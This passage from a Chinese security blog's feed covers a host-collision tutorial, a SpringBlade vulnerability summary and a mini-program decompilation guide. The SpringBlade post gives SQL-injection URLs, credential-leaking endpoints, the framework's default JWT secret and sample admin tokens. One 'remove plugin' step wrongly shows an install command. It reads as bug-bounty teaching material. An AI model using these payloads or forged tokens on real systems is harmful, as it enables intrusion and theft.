<span class="hljs-attr">&quot;picBed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;uploader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;smms&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;smms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;token&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你自己的token！！！！！&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;picgoPlugins&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;picgo-plugin-smms-user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="踩坑解决方法"><a href="#踩坑解决方法" class="headerlink" title="踩坑解决方法"></a>踩坑解决方法</h2><p>还有即使本地预览成功，但是图片上传博客却看不到，就要在文章前加一个标签：</p><meta name="referrer" content="no-referrer"/><p>这里为了方便，我们直接在blog\scaffolds目录下的post.md修改创建新目录的模板，如下，以后使用hexo new &lt;博客&gt;，就会自动配置了。</p><p><img src="https://s2.loli.net/2024/12/13/hsopFQvtC2ZUrAb.png" alt="image-20241213170727534"></p><h2 id="本地踩坑解决方法"><a href="#本地踩坑解决方法" class="headerlink" title="本地踩坑解决方法"></a>本地踩坑解决方法</h2><p>还有提及一点，如果你本地图片的通过相对路径在博客上不能使用，应该是nodejs插件，hexo-asset-image的原因，反正这玩意用不了了，使用hexo-asset-img即可</p><p>先删除原插件</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">npm install hexo-asset-image<br></code></pre></td></tr></table></figure><p>安装新的即可！</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">npm install hexo-asset-<span class="hljs-selector-tag">img</span> <span class="hljs-attr">--save</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Host碰撞实战篇</title>
    <link href="/2024/12/12/Host%E7%A2%B0%E6%92%9E%E5%AE%9E%E6%88%98%E7%AF%87/"/>
    <url>/2024/12/12/Host%E7%A2%B0%E6%92%9E%E5%AE%9E%E6%88%98%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="Host碰撞"><a href="#Host碰撞" class="headerlink" title="Host碰撞"></a>Host碰撞</h1><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>顺口提一嘴…正向代理：代理服务器代理客户端，例如我们搭建代理科学上网</p><p>反向代理：代理服务器代理服务端，测试网站时我们常常使用浏览器插件&lt;–Wappalyzer–&gt;，有时候就会看到Nginx反向代理。反向代理就是有一台代理服务器代理网站站点，例如网站真实站点的ip为101.131.20.162，其代理服务器IP就是121.161.241.36，我们访问时只能访问到121.161.241.36，而不能知道其真实ip。这里也是反向代理的一个目的之一，隐藏真实。</p><p>反向代理如何实现？</p><p>准备：</p><p>1、一台有nginx的服务器</p><p>2、一个域名，该域名DNS解析到我们的nginx服务器代理</p><p>此处我们就不使用https了，只是做个小实验</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">//</span>安装并启动nginx<br>sudo apt install nginx<br>sudo systemctl start nginx<br>sudo systemctl enable nginx<br><br><br><span class="hljs-string">//</span>配置企业常用的反向代理配置：只能用域名访问代理服务器才能访问到内容，否则返回其他页面：包括404<br>sudo vim <span class="hljs-string">/etc/nginx/sites-available/default</span><br><br>修改上述文件内容为下述 <br>server &#123;<br>    listen 80;  <span class="hljs-comment"># 监听 HTTP 请求，也就是通过访问80端口即可访问到后端服务器</span><br>    server_name xxx.com; <span class="hljs-comment"># 替换为你的域名</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-params">($host != &#x27;xxx.xxx.com&#x27;)</span> &#123;<br>        return 404;  <span class="hljs-comment"># 如果不是预期域名，返回 404</span><br>    &#125;<br>    <span class="hljs-comment"># 反向代理到后端服务</span><br>    location / &#123;<br>        proxy_pass https:<span class="hljs-string">//xxx.xxx.xxx.5</span><span class="hljs-function">:5003</span>/login;  <span class="hljs-comment"># 替换为你的后端服务地址和端口</span><br>        proxy_<span class="hljs-keyword">set</span>_header Host $host;<br>        proxy_<span class="hljs-keyword">set</span>_header X-Real-IP $remote_addr;<br>        proxy_<span class="hljs-keyword">set</span>_header X-Forwarded-For $proxy_add_x_forwarded_for;<br>        proxy_http_<span class="hljs-keyword">version</span> 1.1;<br>        proxy_<span class="hljs-keyword">set</span>_header Connection <span class="hljs-string">&quot;upgrade&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment"># 默认的 404 页面</span><br>    error_page 404 <span class="hljs-string">/404.html</span>;<br>    location = <span class="hljs-string">/404.html</span> &#123;<br>        root <span class="hljs-string">/var/www/html</span>;  <span class="hljs-comment"># 替换为你的静态文件目录</span><br>    &#125;<br><br>    <span class="hljs-comment"># 默认的 50x 页面</span><br>    error_page 500 502 503 504 <span class="hljs-string">/50x.html</span>;<br>    location = <span class="hljs-string">/50x.html</span> &#123;<br>        root <span class="hljs-string">/var/www/html</span>;  <span class="hljs-comment"># 替换为你的静态文件目录</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后访问域名<a href="http://www.xxx.com就会成功代理上后端服务器https//xxx.xxx.xxx.5:5003/login">www.xxx.com就会成功代理上后端服务器https://xxx.xxx.xxx.5:5003/login</a></p><p>下图为“后端服务器”</p><p><img src="https://s2.loli.net/2024/12/13/jQrm9loefEc3Dgp.png" alt="image-20241211185427732"></p><p>下图为反向代理服务器的效果，大概由于ssl证书、以及我的域名未备案的原因导致了无法完整显示页面，这里不重要，只是展示一个效果而已，有个标题证明代理成功即可。</p><p><img src="https://s2.loli.net/2024/12/13/1h7JzSXtoPFBbem.png" alt="image-20241211185518471"></p><p>直接用ip访问80端口就不行，就会返回404，因为上面的配置。</p><p><img src="https://s2.loli.net/2024/12/13/C48HYMgSNVOih5t.png" alt="image-20241211192718670"></p><p>直接通过IP访问不行，也就是我们有时候在渗透时，会存在一些IP形式的url，访问会发现返回502、403、404、nginx默认页面、centos默认页面等，这种多半就是代理服务器，它有可能规定了只能使用域名访问，不能直接通过ip访问，这种我们就必须要把这种奇怪的ip保存下来，下面会有用。</p><p>还有一种情况就是我们访问一个由域名组成的url，结果啥也没有。但是这个url不能来着这么无缘无故，其实导致这个的原因就是域名被“废弃”，未解析到任何IP，其中就又存在一种可能，就是使用者一开始把这个域名解析到了代理服务器，不过之后又可能某种原因，废除了这域名。<strong>既然之前解析到过代理服务器并且代理服务器使用过，代理服务器的代理配置就极有可能没有被删除。</strong>在上面的基础上，我们就做个实验，模拟上述情况，展示其利用方式。</p><p>1、删除域名DNS解析代理服务器</p><p><img src="https://s2.loli.net/2024/12/13/ewOYR6VtL257rkN.png" alt="image-20241211193843338"></p><p>2、静候其失效，就相当于废除了该域名。好了！成功返回502，说明该域名没有解析到任何一个IP</p><p><img src="https://s2.loli.net/2024/12/13/74RLZBACMIlkEDS.png" alt="image-20241211194304434"></p><p>我们重新访问代理服务器的80端口，并抓包，把请求头host修改为之前代理服务器配置的域名，发包</p><p><img src="https://s2.loli.net/2024/12/13/iv371hLFgKZ2WwH.png" alt="image-20241211195002569"></p><p>行咯！发现单独使用ip或者域名访问啥也没有，结果两者适当结合一下，却能访问一些不能直接访问的页面。</p><p><img src="https://s2.loli.net/2024/12/13/lsnKXgtM8W5zfH7.png" alt="image-20241211194958225"></p><p>导致这个的原因就是上述提到的<strong>“代理服务器上的配置未删除”</strong></p><p>也就是host碰撞这一技术诞生的根本原因。</p><h2 id="何为host碰撞？"><a href="#何为host碰撞？" class="headerlink" title="何为host碰撞？"></a>何为host碰撞？</h2><p>host碰撞就是通过IP（用作请求url）和域名（用作请求头中的Host）两者的搭配发包，访问到代理服务器，从而访问到可能被隐藏的后端服务器资产的一个信息收集技术。</p><h2 id="host碰撞的作用？"><a href="#host碰撞的作用？" class="headerlink" title="host碰撞的作用？"></a>host碰撞的作用？</h2><p>在信息收集收集资产时，发现可能被废弃的代理服务器，从而发现隐藏的后端服务器。所以该操作可以直接在收集c段、ip、域名之后直接做。</p><h2 id="如何实现host碰撞？"><a href="#如何实现host碰撞？" class="headerlink" title="如何实现host碰撞？"></a>如何实现host碰撞？</h2><p>在我们资产收集后，肯定就会存在有些资产不能直接访问的情况，很有可能就是上述实验中的情况，需要host碰撞。而且这样的资产在一些大型的攻防演练、src中<strong>绝对不会少</strong>。所以我们在拿到比较全的  域名资产、ip资产的时候就可以测测活，记录下回显不是200的资产，并分装到<strong>ip.txt、domain.txt</strong>文件中，先解决一部分回显不正常的，然后在指纹识别的时候，可以看到一些标题如：<strong>Centos欢迎页面、nginx页面、其他欢迎页面这种没有实质内容的标题</strong>，我们也可以进一步把他们添加在之前收集的ip.txt、domain.txt文件中。然后直接上工具。</p><p><a href="https://github.com/pmiaowu/HostCollision">HostCollision-2.2.9</a></p><p>工具功能查看：</p><p><img src="https://s2.loli.net/2024/12/13/xvPNHQJ23KC9edD.png" alt="image-20241211201711155"></p><p>把上述得到的ip.txt、domain.txt扔在该工具目录下</p><p>运行以下命令：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>HostCollision.<span class="hljs-keyword">jar </span>-ifp ip.txt -hfp domain.txt<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/13/niIKhcSm8RrdjTu.png" alt="image-20241211201938705"></p><p>然后得到碰撞成功的列表，我们正常测试站点时肯定不能一直手动切换host，于是下面就推荐两个方法</p><p>1、burp（match and replace rules）</p><p>方便我们直接抓包测试。</p><p>2、浏览器插件：<a href="https://chromewebstore.google.com/detail/modheader-modify-http-hea/idgpnmonknjnojddfkpgkljpfnnfcklj?hl=en">ModHeader</a></p><p>这个我更为推荐，因为有时候不知道怎么回事，burp的那个匹配替换功能会失效，但是用了插件就可以很好的解决这个问题，它可以自动锁定我们自定义的请求头。</p><p>点击Mod，并选择request header</p><p><img src="https://s2.loli.net/2024/12/13/HkSsqrJALFl3Icg.png" alt="image-20241211203935062"></p><p><img src="https://s2.loli.net/2024/12/13/o7PdSvN3RrpXQBO.png" alt="image-20241211204636765"></p><p><img src="https://s2.loli.net/2024/12/13/YQB46WvZ1loTDRK.png" alt="image-20241211204654058"></p><p>然后填写我们的host及其值即可，就可以不管了，直接刷新网页就行了。</p><p><img src="https://s2.loli.net/2024/12/13/afOYocCAWItnKwy.png" alt="image-20241211204756784"></p><p>但是这个设置会影响其他网页的正常访问，所以设置只在我们当前测试站点使用，右键扩展图标，然后如下图勾选即可。</p><p><img src="https://s2.loli.net/2024/12/13/2TaGNoyQzqPOZdR.png" alt="image-20241211204942971"></p><p>即可正常测试了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>springblade漏洞总结</title>
    <link href="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在挖src碰巧遇到了springBlade框架，就此浅显总结一下</p><h2 id="简介-特征"><a href="#简介-特征" class="headerlink" title="简介&amp;特征"></a>简介&amp;特征</h2><blockquote><p>SpringBlade是一个基于Spring Boot和Spring Cloud的微服务架构框架，它是由商业级项目升级优化而来的综合型项目。Springblade是基于spring-boot开发的，接口泄露、sql注入他也存在。</p></blockquote><p><strong>sringblade的特征1</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">icon_hash</span>=<span class="hljs-string">&quot;1047841028&quot;</span><br></code></pre></td></tr></table></figure><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813164919993.png" class="" title="image-20240813164919993"><p><strong>特征2</strong></p><p>在页面加载过程中，会出现以下的加载页面，和最下方的<code>https://bladex.vip</code>，此时我们就可以将这个地址放到fofa上去扩大资产</p><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165144101.png" class="" title="image-20240813165144101"><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">fofa：body<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://bladex.vip&quot;</span><br></code></pre></td></tr></table></figure><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165244200.png" class="" title="image-20240813165244200"><p><strong>特征3</strong></p><p>在路径中若发现<code>blade</code>，这个字段，也基本可以确定是blade框架</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/api/</span>blade-user/info<br><span class="hljs-regexp">/api/</span>blade-auth<span class="hljs-regexp">/oauth/</span>captcha<br>.....<br></code></pre></td></tr></table></figure><h2 id="常见漏洞-实例"><a href="#常见漏洞-实例" class="headerlink" title="常见漏洞&amp;实例"></a>常见漏洞&amp;实例</h2><h3 id="漏洞一：接口泄露"><a href="#漏洞一：接口泄露" class="headerlink" title="漏洞一：接口泄露"></a>漏洞一：接口泄露</h3><p>正常接口路径：&#x2F;api&#x2F;blade-system&#x2F;，不过开发人员一般会改路径，可能改为&#x2F;oaApi&#x2F;blade-system&#x2F;，也可能表面呈现<a href="http://xxx.com/#/system%EF%BC%8C%E8%BF%99%E7%A7%8D%E5%BD%A2%E5%BC%8F%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%8A%93%E5%8C%85%E5%90%8E%E5%B0%B1%E4%BC%9A%E6%98%BE%E9%9C%B2%E4%BC%9A/api/blade-system/%E8%BF%99%E7%A7%8D%E5%BD%A2%E5%BC%8F%E3%80%82">http://xxx.com/#/system，这种形式，不过抓包后就会显露会/api/blade-system/这种形式。</a></p><p>下述就是没有修改的路由的案例</p><p>其中比较常见的泄露：</p><p>&#x2F;api&#x2F;blade-system&#x2F;menu&#x2F;buttons   #暴露路由</p><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132515446.png" class="" title="image-20240814132515446"><p>&#x2F;api&#x2F;blade-system&#x2F;user&#x2F;user-list     #泄露用户名、密码（包括管理员）</p><p>&#x2F;api&#x2F;blade-resource&#x2F;oss&#x2F;list        #泄露AK、SK</p><p>不仅如此，在js文件类里面也会泄露jwt，可直接访问</p><p>泄露的路由还有如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">下述只对找到的案例存在的路由进行了解释：<br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/user/u</span>ser-list   <span class="hljs-comment">#用户列表</span><br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/tenant/</span>select<span class="hljs-comment">#租户选择</span><br><span class="hljs-regexp">/api/</span>blade-develop<span class="hljs-regexp">/datasource/</span>list<br><span class="hljs-regexp">/api/</span>blade-resource<span class="hljs-regexp">/oss/</span>list<br><span class="hljs-regexp">/api/</span>blade-develop<span class="hljs-regexp">/datasource/</span>list<br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/code/</span>remove<br><span class="hljs-regexp">/api/</span>blade-resource<span class="hljs-regexp">/oss/</span>remove<br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/dict-biz/</span>remove<br><span class="hljs-regexp">/authority/</span>role/add    <span class="hljs-comment">#添加用户</span><br><span class="hljs-regexp">/system/</span>dict/add<span class="hljs-comment">#添加字典</span><br>.......<br></code></pre></td></tr></table></figure><h3 id="漏洞二：弱口令-AK、SK泄露"><a href="#漏洞二：弱口令-AK、SK泄露" class="headerlink" title="漏洞二：弱口令&amp;AK、SK泄露"></a>漏洞二：弱口令&amp;AK、SK泄露</h3><p>这个站点很奇葩，当我登录的时候，他自动就把账号和密码（也是弱口令）填写进去了，直接登陆即可了，进去大概看了一下就泄露了</p><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813134409260.png" class="" title="image-20240813134409260"><p>然后直接使用ossbrower连接即可</p><h3 id="漏洞三：SQL注入"><a href="#漏洞三：SQL注入" class="headerlink" title="漏洞三：SQL注入"></a>漏洞三：SQL注入</h3><p>第一处：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/api/blade-<span class="hljs-built_in">log</span>/<span class="hljs-keyword">error</span>/<span class="hljs-built_in">list</span>?updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">version</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132621776.png" class="" title="image-20240814132621776"><p>第二处：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/api/blade-<span class="hljs-keyword">user</span>/export-<span class="hljs-keyword">user</span>?Blade-Auth=[jwt码]&amp;account=&amp;realName=&amp;<span class="hljs-number">1</span>-updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,version(),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>)=<span class="hljs-number">1</span><br><br>如果前端使用的saber，则可以用下述saber-<span class="hljs-keyword">access</span>-token/saber-<span class="hljs-keyword">refresh</span>-token替换上述的jwt码，下面一个漏洞也同理<br><br>```<br>Cookie: saber-<span class="hljs-keyword">access</span>-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwidG9rZW5fdHlwZSI6ImFjY2Vzc190b2tlbiIsImRlcHRfaWQiOiIxMTIzNTk4ODEzNzM4Njc1MjAxIiwiYWNjb3VudCI6ImFkbWluIiwiY2xpZW50X2lkIjoic2FiZXIiLCJleHAiOjE3MjM2MDE3NTcsIm5iZiI6MTcyMzU5ODE1N30.N4arC25-V_qBBlxmjLlvvN2VaZ3iPvc-xht2VEPMOq4; saber-<span class="hljs-keyword">refresh</span>-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInRva2VuX3R5cGUiOiJyZWZyZXNoX3Rva2VuIiwiY2xpZW50X2lkIjoic2FiZXIiLCJleHAiOjE3MjQyMDI5NTcsIm5iZiI6MTcyMzU5ODE1N30<span class="hljs-number">.0</span>U0aZzVdesBjS3VNBFyDN1D7jFWM54XPd6kdWHWL394<br>```<br></code></pre></td></tr></table></figure><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132658231.png" class="" title="image-20240814132658231"><h3 id="漏洞四：JWT硬编码越权"><a href="#漏洞四：JWT硬编码越权" class="headerlink" title="漏洞四：JWT硬编码越权"></a>漏洞四：JWT硬编码越权</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject</span><br></code></pre></td></tr></table></figure><p>漏洞原因：开发者在使用jwt进行身份认证时，并没有对默认的jwt密钥进行修改，导致黑客可以利用默认的jwt密钥去伪造jwt值，可以欺骗服务器获取用户权限等</p><p>教程：将上面的密钥放到箭头指示的位置，然后修改payload里的字段，因为服务器都是通过这个payload中的字段进行鉴权的，所以通过修改payload中的字段，来达到伪造jwt欺骗服务器</p><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170002896.png" class="" title="image-20240813170002896"><p>将修改后的jwt字段，放回Blade-Auth中，放包，看是否回显，若回显，则证明存在jwt硬编码。</p><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170028058.png" class="" title="image-20240813170028058"><p>不成功则会出现未授权</p><img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170043219.png" class="" title=".&#x2F;blade漏洞总结&#x2F;image-20240813170043219">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>小程序反编译</title>
    <link href="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <url>/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h1 id="小程序解密-反编译"><a href="#小程序解密-反编译" class="headerlink" title="小程序解密+反编译"></a>小程序解密+反编译</h1><blockquote><p><strong>将访问的小程序进行解密和反向编译拿到部分源码，然后对源码进行安全审计，分析出其中可能存在的信息泄露或者说路径等一些关键信息。</strong></p></blockquote><h2 id="前置环境准备"><a href="#前置环境准备" class="headerlink" title="前置环境准备"></a>前置环境准备</h2><p>1、nodejs环境安装（<a href="https://nodejs.org/en">https://nodejs.org/en</a>，官网安装即可）</p><p>2、解密反编译工具(wxapkg：<a href="https://github.com/wux1an/wxapkg/releases/tag/v1.5.0">https://github.com/wux1an/wxapkg/releases/tag/v1.5.0</a>)</p><p>3、微信小程序（一般大厂的小程序可能存在无法反编译，选一些简单点的就行）</p><h2 id="反编译最初目录结构"><a href="#反编译最初目录结构" class="headerlink" title="反编译最初目录结构"></a>反编译最初目录结构</h2><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>myApp<span class="hljs-operator">/</span><br><span class="hljs-number">2</span>  ├── app.json   ——小程序全局配置文件，用于定义小程序的基本属性和页面路径。）            <br><span class="hljs-number">3</span>  ├── app.wxss   ——全局样式表，定义整个小程序的公共样式。）<br><span class="hljs-number">4</span>  ├── app.js     ——小程序的入口文件，可以在这里进行全局数据初始化、监听、处理等。<br><span class="hljs-number">5</span>  ├── project.config.json ——项目配置文件，用于设置编译模式、调试模式、云开发环境等信息。<br><span class="hljs-number">6</span>  ├── pages<span class="hljs-operator">/</span>      <span class="hljs-operator">-</span> 存放所有页面文件的地方，每个页面由以下四个同名文件组成：<br><span class="hljs-number">7</span>  │   ├── index<span class="hljs-operator">/</span>   <br><span class="hljs-number">8</span>  │   │   ├── index.wxml    ——页面结构文件，使用类似HTML的WXML语言编写。<br><span class="hljs-number">9</span>  │   │   ├── index.wxss    ——页面样式文件，使用WXSS语言编写，用于定义该页面的样式，类似css<br><span class="hljs-number">10</span> │   │   ├── index.js      ——页面逻辑文件，使用JavaScript编写，用于处理页面逻辑和数据交互。<br><span class="hljs-number">11</span> │   │   └── index.json    ——页面配置文件，用于定义页面的窗口样式和一些其他页面级别的配置。<br><span class="hljs-number">12</span> │   └── about<span class="hljs-operator">/</span><br><span class="hljs-number">13</span> │       ├── about.wxml<br><span class="hljs-number">14</span> │       ├── about.wxss<br><span class="hljs-number">15</span> │       ├── about.js<br><span class="hljs-number">16</span> │       └── about.json<br><span class="hljs-number">17</span> ├── components<span class="hljs-operator">/</span>       ——存放可复用的组件文件夹，组件同样有 .wxml, .wxss, .js 和 .json 文件。<br><span class="hljs-number">18</span> │   └── myComponent<span class="hljs-operator">/</span><br><span class="hljs-number">19</span> │       ├── myComponent.wxml<br><span class="hljs-number">20</span> │       ├── myComponent.wxss<br><span class="hljs-number">21</span> │       ├── myComponent.js<br><span class="hljs-number">22</span> │       └── myComponent.json<br><span class="hljs-number">23</span> ├── utils<span class="hljs-operator">/</span>          ——存放工具函数的文件夹，例如日期处理、数据加密解密等。<br><span class="hljs-number">24</span> │   └── api.js<br><span class="hljs-number">25</span> ├── <span class="hljs-keyword">static</span><span class="hljs-operator">/</span>   ——存放静态资源如图片、字体、音频视频等文件。<br><span class="hljs-number">26</span> │   └── logo.png<br><span class="hljs-number">27</span> ├── api<span class="hljs-operator">/</span>    ——通常用于存放网络请求相关的代码，如与后端服务器的数据交互。<br><br>上述结构中，pages<span class="hljs-operator">/</span>index<span class="hljs-operator">/</span> 目录下的文件构成了首页，而 pages<span class="hljs-operator">/</span>about<span class="hljs-operator">/</span> 目录下的文件则构成了关于页面。每个页面的四个文件组成了一个完整的页面模块。<br></code></pre></td></tr></table></figure><h2 id="反编译目录结构（微信服务器整合）"><a href="#反编译目录结构（微信服务器整合）" class="headerlink" title="反编译目录结构（微信服务器整合）"></a>反编译目录结构（微信服务器整合）</h2><p>反编译后的目录结构主要由反编译的工具决定，反编译后的目录结构除了上述最原始的目录，还包括一下由微信服务器整合过后的结构。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">只是把部分文件进行了合并<br>app<span class="hljs-operator">-</span>config.json<br>小程序工程主要包括工具配置 project.config.json，全局配置 app.json 以及页面配置 page.json 三类 JSON 配置文件。<br><br>app<span class="hljs-operator">-</span>service.js<br>在小程序项目中 JS 文件负责交互逻辑，主要包括 app.js，每个页面的 page.js，开发者自定义的 JS 文件和引入的第三方 JS 文件，在“编译”后所有这些 JS 文件都会被汇总到app<span class="hljs-operator">-</span>service.js 文件中<br><br>app<span class="hljs-operator">-</span>wxss.js<br>在小程序项目中 wxss 文件负责交互逻辑，主要包括 app.wxss，以及每个页面的wxss文件<br></code></pre></td></tr></table></figure><h2 id="开始反编译"><a href="#开始反编译" class="headerlink" title="开始反编译"></a>开始反编译</h2><h3 id="1、定位微信小程序目录的位置"><a href="#1、定位微信小程序目录的位置" class="headerlink" title="1、定位微信小程序目录的位置"></a>1、定位微信小程序目录的位置</h3><p>登录微信——&gt;设置——&gt;文件管理</p><img src="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled-1723536749584-9.png" class="" title="Untitled-1723536749584-9"><p>然后随机挑选一个小程序打开（尽量多点点其中的功能点）</p><p>定位到该目录下的Applet，通过时间找到指定小程序的目录即可</p><img 